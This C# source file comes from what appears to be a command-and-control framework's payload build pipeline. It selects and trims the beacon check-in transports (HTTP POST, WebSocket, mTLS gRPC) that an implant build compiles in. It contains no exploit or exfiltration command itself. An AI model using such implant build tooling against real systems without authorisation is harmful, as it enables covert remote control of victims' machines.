namespace Rod.BuildPipeline.PayloadBuild;

/// <summary>
/// The check-in mode wire values a build profile bakes (the same strings the
/// implant's Config normalizes): "stream" holds a connection open, "poll"
/// cycles. The web URL shape splits by it -- stream dials the WebSocket
/// beacon, poll runs the envelope POST cycle.
/// </summary>
public static class CheckInModes
{
    public const string Stream = "stream";
    public const string Poll = "poll";
}

/// <summary>
/// The check-in modules a build compiles in (architecture.md Sec 8): the
/// envelope POST cycle for web-front entries on a poll-mode bake, the
/// WebSocket stream for web-front entries on a stream-mode bake, and the
/// mTLS gRPC stream for bare host:port entries. The egress walk the profile
/// bakes decides the shapes and the baked mode picks the web client -- an
/// artifact carries exactly the transports its walk and mode can dial, so a
/// poll web build ships no WebSocket client and a stream web build ships no
/// POST cycle.
/// </summary>
[Flags]
public enum CheckInModules
{
    None = 0,

    /// <summary>
    /// The envelope POST cycle client (the implant's EnvelopeBeacon): serves
    /// walk entries whose beacon URL is a schemed http(s) front on a
    /// poll-mode bake.
    /// </summary>
    Web = 1,

    /// <summary>
    /// The mTLS gRPC stream client (the implant's Beacon): serves walk
    /// entries whose beacon URL is a bare host:port.
    /// </summary>
    Stream = 2,

    /// <summary>
    /// The WebSocket stream client (the implant's WsBeacon): serves walk
    /// entries whose beacon URL is a schemed http(s) front on a stream-mode
    /// bake -- the web posture's interactive tier.
    /// </summary>
    WebSocket = 4,
}

/// <summary>
/// The bake-time transport trim (architecture.md Sec 6, Sec 8): selects
/// which check-in modules an implant-class build compiles and rewrites the
/// staging copy accordingly. The selection rule mirrors the implant's own
/// run-time discriminator exactly -- a walk entry whose beacon URL is a
/// schemed http(s) front runs the envelope POST cycle, a bare host:port runs
/// the mTLS gRPC stream -- applied to every entry the profile bakes (the
/// primary plus each fallback), so the compiled set is precisely the set of
/// shapes the artifact can dial and never smaller.
/// </summary>
/// <remarks>
/// The trim is whole source files: the unselected modules' files leave the
/// staging copy's compilation, and a generated selection file replaces the
/// checked-in TransportSelection stub naming only the compiled factories --
/// the same replace-a-stub generation BakedProfile.cs and the extension
/// registrations use. The gRPC generation rides along through the implant
/// csproj's RodGrpcServices switch (message types only when no stream module
/// compiles), which also drops the Grpc.Net.Client reference: a web-shaped
/// artifact links no gRPC client code at all, and a stream-shaped one keeps
/// the full client. The stager tree is never trimmed: it fetches over plain
/// HTTP and carries no check-in clients.
/// </remarks>
public static class TransportModuleSelection
{
    // The web module's whole source files, relative to the implant tree root.
    private static readonly string[] WebModuleFiles =
    {
        "Internal/EnvelopeBeacon.cs",
        "Internal/WebCheckIn.cs",
    };

    // The stream module's whole source files, relative to the implant tree
    // root.
    private static readonly string[] StreamModuleFiles =
    {
        "Internal/Beacon.cs",
        "Internal/StreamCheckIn.cs",
    };

    // The WebSocket stream module's whole source files (the client and its
    // factory ride one file), relative to the implant tree root.
    private static readonly string[] WebSocketModuleFiles =
    {
        "Internal/WsBeacon.cs",
    };

    // The generated selection replaces this checked-in stub, relative to the
    // implant tree root. The stub names both modules so the dev tree runs
    // against either URL shape.
    private const string SelectionFile = "Internal/TransportSelection.cs";

    /// <summary>
    /// Selects the check-in modules a profile's baked egress walk needs: the
    /// primary entry's beacon URL (the named beacon endpoint, else the one
    /// derived from the enroll endpoint -- the same value
    /// <c>RenderBakedProfile</c> bakes as <c>beaconURL</c>) plus each
    /// fallback's derived URL, classified by the implant's own web-or-bare
    /// rule, with the baked mode splitting the web shape -- stream dials the
    /// WebSocket beacon, poll runs the envelope POST cycle. A walk that can
    /// cross shapes (a stream primary with web fallbacks) keeps every client
    /// it can dial, so no bake ever strands the artifact on an entry it
    /// cannot run.
    /// </summary>
    public static CheckInModules Select(TransportProfile profile, string mode)
    {
        var modules = CheckInModules.None;
        Consider(profile.BeaconEndpoint ?? DotNetBuildUnit.BeaconUrlFromEnroll(profile.Endpoint));
        foreach (var fallback in profile.FallbackEndpoints)
            Consider(DotNetBuildUnit.BeaconUrlFromEnroll(fallback));
        return modules;

        void Consider(string beaconUrl)
        {
            if (IsWebBeaconUrl(beaconUrl))
                modules |= mode == CheckInModes.Stream ? CheckInModules.WebSocket : CheckInModules.Web;
            else
                modules |= CheckInModules.Stream;
        }
    }

    /// <summary>
    /// Whether the compilation needs the generated gRPC client (and with it
    /// the Grpc.Net.Client reference): only a walk with a stream-shaped
    /// entry dials one.
    /// </summary>
    public static bool NeedsGrpcClient(CheckInModules modules)
        => (modules & CheckInModules.Stream) != 0;

    /// <summary>
    /// Rewrites the staging copy of the implant tree to carry exactly the
    /// selected modules: the unselected modules' source files are deleted
    /// whole, and the generated TransportSelection replaces the checked-in
    /// stub naming only the compiled factories. A set of
    /// <see cref="CheckInModules.None"/> is refused -- a primary entry always
    /// exists, so an empty set means the caller, not the profile, is wrong.
    /// </summary>
    public static void Apply(string stagingDir, CheckInModules modules)
    {
        if (modules == CheckInModules.None)
            throw new InvalidOperationException(
                "A build must compile at least one check-in module; the egress walk's primary entry always has a shape.");

        if (!NeedsGrpcClient(modules))
        {
            foreach (var file in StreamModuleFiles)
                File.Delete(Path.Combine(stagingDir, file));
        }
        if ((modules & CheckInModules.Web) == 0)
        {
            foreach (var file in WebModuleFiles)
                File.Delete(Path.Combine(stagingDir, file));
        }
        if ((modules & CheckInModules.WebSocket) == 0)
        {
            foreach (var file in WebSocketModuleFiles)
                File.Delete(Path.Combine(stagingDir, file));
        }

        File.WriteAllText(Path.Combine(stagingDir, SelectionFile), RenderSelection(modules));
    }

    // Renders the per-build TransportSelection: same shape as the checked-in
    // stub, naming only the compiled factories. The implant's Program hands
    // this array to its check-in coordinator, which picks per URL shape and
    // mode at run time -- with one module compiled the pick is constant, with
    // several (a shape-crossing walk) it follows the walk exactly as the dev
    // tree does.
    private static string RenderSelection(CheckInModules modules)
    {
        var factories = new List<string>();
        if ((modules & CheckInModules.Web) != 0)
            factories.Add("        WebCheckIn.Create(setup),");
        if ((modules & CheckInModules.WebSocket) != 0)
            factories.Add("        WsCheckIn.Create(setup),");
        if (NeedsGrpcClient(modules))
            factories.Add("        StreamCheckIn.Create(setup),");
        return
            "// <auto-generated> Generated by Rod.DotNetBuildUnit at build time.\n"
            + "// The check-in modules this artifact compiles (architecture.md Sec 8),\n"
            + "// selected from the baked egress walk's URL shapes.\n"
            + "namespace Rod.Implant.Internal;\n\n"
            + "internal static class TransportSelection\n"
            + "{\n"
            + "    public static ICheckInClient[] CreateClients(CheckInSetup setup) =>\n"
            + "    [\n"
            + string.Join("\n", factories) + "\n"
            + "    ];\n"
            + "}\n";
    }

    // The implant's BeaconUrl.IsWeb, mirrored: a beacon URL naming a web
    // front (a schemed http(s) URL) carries the envelope POST cycle; a bare
    // host:port is the mTLS stream's dial shape. Kept in textual lockstep
    // with the implant's predicate -- the wire-side test pins both.
    private static bool IsWebBeaconUrl(string beaconUrl)
        => beaconUrl.Trim().StartsWith("http://", StringComparison.OrdinalIgnoreCase)
           || beaconUrl.Trim().StartsWith("https://", StringComparison.OrdinalIgnoreCase);
}
